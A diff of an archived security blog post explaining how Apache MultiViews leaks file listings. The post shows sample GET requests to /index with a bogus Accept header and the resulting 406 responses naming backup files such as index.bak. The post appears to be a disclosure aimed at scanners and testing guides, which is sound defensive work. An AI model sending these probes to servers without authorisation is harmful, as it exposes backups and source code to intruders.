@@ -1,14 +1,13 @@
 ---
 type: Article
 title: Wisec - The WIse SECurity
-description: Apache MultiViews turns one request into a directory listing. Requesting /index with an unsatisfiable Accept header makes the server answer 406 and enumerate every same-named variant in its Alternates header, exposing index.bak and other backups. Di Paola argues scanners and the OWASP Testing Guide should check for the Content-Location/Vary/TCN fingerprint.
 resource: "http://www.wisec.it/sectou.php?id=4698ebdc59d15"
-tags: [article, webseclist-reference, wisec-it, info-leak, http, content-type, mime, abuse-of-functionality, detection, owasp-a04-2021, owasp-a05-2021, owasp-a09-2021]
+tags: [article, webseclist-reference, wisec-it]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-11T19:37:41+00:00"
+  at: "2026-08-16T23:13:02+00:00"
 status: stable
-stale_after: 2027-08-11
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "http://www.wisec.it/sectou.php?id=4698ebdc59d15"
@@ -21,7 +20,7 @@ canonical_url: ""
 cited_by:
   - "2007.md:35"
 commit: ""
-content_sha256: 6de540c5885c51a5c76213033a332a64f8b1dc77018c50856a9d3a7df7f61172
+content_sha256: b5627203b9232b9007697b6eb7e19b33111f9ee8534c240013c8debf056015c1
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +33,7 @@ publisher_english: ""
 raw_sha256: ebe62961deb20ce2d015d51b48ab1eec1212e7891b4bc1a404591cbe51f9172f
 retrieved_from: "http://www.wisec.it/sectou.php?id=4698ebdc59d15"
 retrieved_kind: stored
-retrieved_utc: "2026-08-11T19:37:41+00:00"
+retrieved_utc: "2026-08-16T23:13:02+00:00"
 slug: wisec-it-wisec-wise-security
 snapshot: ""
 title_english: ""
@@ -48,7 +47,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://www.wisec.it/sectou.php?id=4698ebdc59d15>
-- Preserved from: http://www.wisec.it/sectou.php?id=4698ebdc59d15 (stored) on 2026-08-11
+- Preserved from: http://www.wisec.it/sectou.php?id=4698ebdc59d15 (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -125,17 +124,15 @@ This is a small post about a way to easily get backup files on Apache web server
 
  MultiViews is an Apache option which acts with the following [ rules](http://httpd.apache.org/docs/1.3/content-negotiation.html):
 
->
- if the server receives a request for /some/dir/foo, if /some/dir has MultiViews enabled, and /some/dir/foo does not exist, then the server reads the directory looking for files named foo.*, and effectively fakes up a type map which names all those files, assigning them the same media types and content-encodings it would have if the client
- had asked for one of them by name. It then chooses the best match to the client's requirements.
+>  if the server receives a request for /some/dir/foo, if /some/dir has MultiViews enabled, and /some/dir/foo does not exist, then the server reads the directory looking for files named foo.*, and effectively fakes up a type map which names all those files, assigning them the same media types and content-encodings it would have if the client
+>  had asked for one of them by name. It then chooses the best match to the client's requirements.
 
  How the best match is chosen by Apache?
  It depends on several Accept* headers in the client Request.**
 
->
- Accept
- Accept-Language
- Accept-Encoding
+>  Accept
+>  Accept-Language
+>  Accept-Encoding
 
  Let's see how it works:
 
@@ -143,68 +140,63 @@ This is a small post about a way to easily get backup files on Apache web server
 
  If an attacker requests "index" without any extension:
 
->
- GET /index HTTP/1.1
- Host: myhost
- Accept: */*
+>  GET /index HTTP/1.1
+>  Host: myhost
+>  Accept: */*
 
  the web server will reply with:
 
->
- HTTP/1.1 200 OK
- Date: Sat, 14 Jul 2007 14:46:22 GMT
- Server: Apache/2.0.55 (Ubuntu)
- Content-Location: index.php
- Vary: negotiate,accept
- TCN: choice
- Last-Modified: Sat, 14 Jul 2007 10:58:38 GMT
- ETag: "8d15d-0-1c1d5380;498a0540"
- Accept-Ranges: bytes
- Content-Length: #ofBytes
- Content-Type: text/html; charset=UTF-8
+>  HTTP/1.1 200 OK
+>  Date: Sat, 14 Jul 2007 14:46:22 GMT
+>  Server: Apache/2.0.55 (Ubuntu)
+>  Content-Location: index.php
+>  Vary: negotiate,accept
+>  TCN: choice
+>  Last-Modified: Sat, 14 Jul 2007 10:58:38 GMT
+>  ETag: "8d15d-0-1c1d5380;498a0540"
+>  Accept-Ranges: bytes
+>  Content-Length: #ofBytes
+>  Content-Type: text/html; charset=UTF-8
 
  Now, it could be noticed that in the server response several interesting headers are out:
 
->
- Content-Location: index.php
- Vary: negotiate,accept
- TCN: choice
+>  Content-Location: index.php
+>  Vary: negotiate,accept
+>  TCN: choice
 
  This means there is MultiViews enabled on / directory.
 
  Let's see if in the request we use a "Accept:" header with an inexistent mime type:
 
->
- GET /index HTTP/1.1
- Host: myhost
- Accept: application/whatever; q=1.0
+>  GET /index HTTP/1.1
+>  Host: myhost
+>  Accept: application/whatever; q=1.0
 
  the server will reply with:
 
+>  HTTP/1.1 406 Not Acceptable
+>  Date: Sat, 14 Jul 2007 14:51:29 GMT
+>  Server: Apache/2.0.55 (Ubuntu)
+>  Alternates: {"index.bak" 1 {type application/x-trash} {length 3}},
+>  {"index.php" 1 {type application/x-httpd-php} {length 3}}
+>  Vary: negotiate,accept
+>  TCN: list
+>  Content-Length: NNNN
+>  Content-Type: text/html; charset=iso-8859-1
 >
- HTTP/1.1 406 Not Acceptable
- Date: Sat, 14 Jul 2007 14:51:29 GMT
- Server: Apache/2.0.55 (Ubuntu)
- Alternates: {"index.bak" 1 {type application/x-trash} {length 3}},
- {"index.php" 1 {type application/x-httpd-php} {length 3}}
- Vary: negotiate,accept
- TCN: list
- Content-Length: NNNN
- Content-Type: text/html; charset=iso-8859-1
-
- <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
- <html><head>
- <title>406 Not Acceptable</title>
- </head><body>
- <h1>Not Acceptable</h1>
- <p>An appropriate representation of the requested resource /index could not
- be found on this server.</p>
- Available variants:
- <ul>
- <li><a href="index.php">index.php</a> , type text/html</li>
- <li><a href="index.bak">index.bak</a> , type application/x-trash</li>
- </ul>
- <hr>
+>  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+>  <html><head>
+>  <title>406 Not Acceptable</title>
+>  </head><body>
+>  <h1>Not Acceptable</h1>
+>  <p>An appropriate representation of the requested resource /index could not
+>  be found on this server.</p>
+>  Available variants:
+>  <ul>
+>  <li><a href="index.php">index.php</a> , type text/html</li>
+>  <li><a href="index.bak">index.bak</a> , type application/x-trash</li>
+>  </ul>
+>  <hr>
 
  aha! With a single request we get a listing of all the files!
  And for free..as in free speech ;)
@@ -223,3 +215,15 @@ This is a small post about a way to easily get backup files on Apache web server
 **[nEUrOO](http://rgaucher.info)**, Monday, July 16, 2007, 22:12
 
 **[Bunyamin Demir](http://www.webguvenligi.org)**, Tuesday, July 17, 2007, 13:02
+
+**Comments are disabled**
+
+[Admin login](http://www.wisec.it/sectou.php?login) | This weblog is from [www.mylittlehomepage.net](http://www.mylittlehomepage.net/)
+
+# Wisec is brought to you by...
+
+Wisec is written and mantained by  Stefano Di Paola.
+
+Wisec uses open standards, including XHTML, CSS2, and XML-RPC.
+
+  |  |
